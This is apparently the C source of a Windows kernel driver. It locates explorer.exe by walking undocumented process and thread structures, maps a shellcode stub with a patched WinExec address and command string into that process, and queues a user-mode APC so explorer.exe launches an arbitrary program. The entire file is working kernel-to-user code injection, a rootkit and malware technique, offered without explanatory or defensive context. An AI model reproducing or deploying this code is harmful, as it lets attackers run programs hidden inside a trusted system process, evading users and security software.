#include "Process.h"

typedef enum
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment
} KAPC_ENVIRONMENT;

void ApcKernelRoutine(
	IN struct _KAPC *Apc,
	IN OUT PKNORMAL_ROUTINE *NormalRoutine,
	IN OUT PVOID *NormalContext,
	IN OUT PVOID *SystemArgument1,
	IN OUT PVOID *SystemArgument2);
NTSTATUS InstallUserModeApc(LPSTR lpProcess, ULONG pTargetThread, ULONG pTargetProcess);
void ApcCreateProcess(PVOID NormalContext, PVOID SystemArgument1, PVOID SystemArgument2);
void ApcCreateProcessEnd();

ULONG ActiveProcessLinksOffset = 0x88;
ULONG ImageFileNameOffset = 0x174;    
ULONG ThreadListHeadOffset = 0x50;
ULONG ThreadListEntryOffset = 0x1B0;
ULONG AltertableOffset = 0x164;
ULONG WinExecOffset = 0x7C8623AD;

void DependVersion()
{
	ULONG MajorVersion, MinorVersion;
	PsGetVersion(&MajorVersion, &MinorVersion, NULL, NULL);
	if (MajorVersion == 6)
	{
		WinExecOffset = 0x77E6E5FD;
		ActiveProcessLinksOffset = 0xb8;
		ImageFileNameOffset = 0x16C;
		ThreadListHeadOffset = 0x190;
		ThreadListEntryOffset = 0x1e0;
		AltertableOffset = 0x3C;
	}
}

void RunProcess(LPSTR lpProcess)
{
	ULONG Alert;
	char *name;
	ULONG pTargetProcess;
	ULONG pTargetThread;
	ULONG pNotAlertableThread;
	ULONG pSystemProcess;
	ULONG pTempThread;
	ULONG pNextEntry, pListHead, pThreadNextEntry, pThreadListHead;

	if (strlen(lpProcess) > 300) return;
	pSystemProcess = (ULONG)PsGetCurrentProcess();
	if (!pSystemProcess)
	{
		DbgPrint("APCExec -> Cannot find System process!");
		return;
	}

	pListHead = pSystemProcess + ActiveProcessLinksOffset;
	pNextEntry = *(ULONG*)pListHead;
	if (!pNextEntry)
	{
		DbgPrint("KernelExec -> No processes found!");
		return;
	}
	
	while (pNextEntry != pListHead)
	{
		pSystemProcess = pNextEntry - ActiveProcessLinksOffset;
		name = (char *)pSystemProcess + ImageFileNameOffset;
		DbgPrint("ProcessName %s\n", name);
		if (_strnicmp(name, "explorer.exe", 12) == 0)
		{
			pTargetProcess = pSystemProcess;
			DbgPrint("Found explorer.exe!\n");
			pTargetThread = pNotAlertableThread = 0;
			pThreadListHead = pSystemProcess + ThreadListHeadOffset;
			pThreadNextEntry = *(ULONG*)pThreadListHead;
			while (pThreadNextEntry != pThreadListHead)
			{
				pTempThread = pThreadNextEntry - ThreadListEntryOffset;
				DbgPrint("ETHREAD address is : 0x%08x\n", (ULONG*)pTempThread);
				DbgPrint("Alertable is : 0x%08x", *(char*)(pTempThread + AltertableOffset));

				if (AltertableOffset == 0x164)
				{
					Alert = *(char*)(pTempThread + AltertableOffset);
				}
				else
				{
					Alert = (*(char*)(pTempThread + AltertableOffset)) & (1<<8);
				}
				if (Alert)
				{
					pTargetThread = pTempThread;
					DbgPrint("Found alertable thread!\n");
					break;
				}
				else
				{
					pNotAlertableThread = pTempThread;
				}
				pThreadNextEntry = *(ULONG*)pThreadNextEntry;
			}
			break;
		}
		pNextEntry = *(ULONG*)pNextEntry;
	}
	
	if (!pTargetProcess)
	{
		DbgPrint("Could not find Explorer.exe");
		return;
	}
	if (!pTargetThread)
	{
		pTargetThread = pNotAlertableThread;
	}
	if (pTargetThread)
	{
		DbgPrint("Target thread: 0x%p", pTargetThread);
		InstallUserModeApc(lpProcess, pTargetThread, pTargetProcess);
	}
	else
	{
		DbgPrint("No thread found!\n");
	}
}

PMDL MyMDL = NULL;
void ApcKernelRoutine(IN struct _KAPC *Apc, 
					  IN OUT PKNORMAL_ROUTINE *NormalRoutine, 
					  IN OUT PVOID *NormalContext,
					  IN OUT PVOID *SystemArgument1, 
					  IN OUT PVOID *SystemArgument2)
{
	if (Apc) ExFreePool(Apc);
	if (MyMDL)
	{
		MmUnlockPages(MyMDL);
		IoFreeMdl(MyMDL);
		MyMDL = NULL;
	}
	DbgPrint("ApcKernelRoutine called!\n");
}

NTSTATUS InstallUserModeApc(LPSTR lpProcess, ULONG pTargetThread, ULONG pTargetProcess)
{
	PRKAPC pApc = NULL;
	PVOID pMappedAddress = NULL;
	ULONG dwSize = 0;
	KAPC_STATE ApcState;
	ULONG *data_addr = NULL;
	ULONG dwMappedAddress = 0;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	if (!pTargetProcess || !pTargetThread)
	{
		return status;
	}
	pApc = ExAllocatePool(NonPagedPool, sizeof(KAPC));
	if (!pApc)
	{
		DbgPrint("ExAllocatePool failed!\n");
		return status;
	}

	dwSize = (unsigned char*)ApcCreateProcessEnd - (unsigned char*)ApcCreateProcess;
	MyMDL = IoAllocateMdl(ApcCreateProcess, dwSize, FALSE, FALSE, NULL);
	if (!MyMDL)
	{
		DbgPrint("Failed to allocate MDL!\n");
		ExFreePool(pApc);
		return status;
	}

	__try
	{
		MmProbeAndLockPages(MyMDL, KernelMode, IoWriteAccess);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("MmProbeAndLockPages error!\n");
		IoFreeMdl(MyMDL);
		ExFreePool(pApc);
		return status;
	}

	KeStackAttachProcess((PRKPROCESS)pTargetProcess, &ApcState);
	pMappedAddress = MmMapLockedPagesSpecifyCache(MyMDL,
		UserMode, MmCached, NULL, FALSE, NormalPagePriority);

	if (!pMappedAddress)
	{
		DbgPrint("Cannot map address");
		KeUnstackDetachProcess(&ApcState);
		IoFreeMdl(MyMDL);
		ExFreePool(pApc);
		return STATUS_UNSUCCESSFUL;
	}
	else
	{
		DbgPrint("Memory at %p", pMappedAddress);
	}

	dwMappedAddress = (ULONG)pMappedAddress;
	memset((unsigned char*)pMappedAddress + 0x14, 0, 50);
	memcpy((unsigned char*)pMappedAddress + 0x14, lpProcess, strlen(lpProcess));
	memcpy((unsigned char*)pMappedAddress + 0x1, &WinExecOffset, sizeof(ULONG));

	data_addr = (ULONG *)((char*)pMappedAddress + 0x9);
	*data_addr = dwMappedAddress + 0x14;

	KeUnstackDetachProcess(&ApcState);
	KeInitializeApc(pApc,
		(ULONG*)pTargetThread,
		OriginalApcEnvironment,
		&ApcKernelRoutine,
		NULL,
		pMappedAddress,
		UserMode,
		NULL);
	if (!KeInsertQueueApc(pApc, 0, NULL, 0))
	{
		DbgPrint("Failed to insert APC");
		MmUnlockPages(MyMDL);
		IoFreeMdl(MyMDL);
		ExFreePool(pApc);
		return STATUS_UNSUCCESSFUL;
	}
	else
	{
		DbgPrint("Apc delivered!\n");
	}

	if (!*(char*)(pTargetThread+0x4a))
	{
		*(char*)(pTargetThread+0x4a) = TRUE;
	}
	return 0;
}

__declspec(naked) void ApcCreateProcess(PVOID NormalContext, PVOID  SystemArgument1, PVOID SystemArgument2)
{
	__asm 
	{
		mov eax,0x7C8623AD
		push 1
		nop
		push 0xabcd
		call eax
		jmp end       
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
end:
		nop
		ret 0x0c
	}

}

void ApcCreateProcessEnd()
{

}
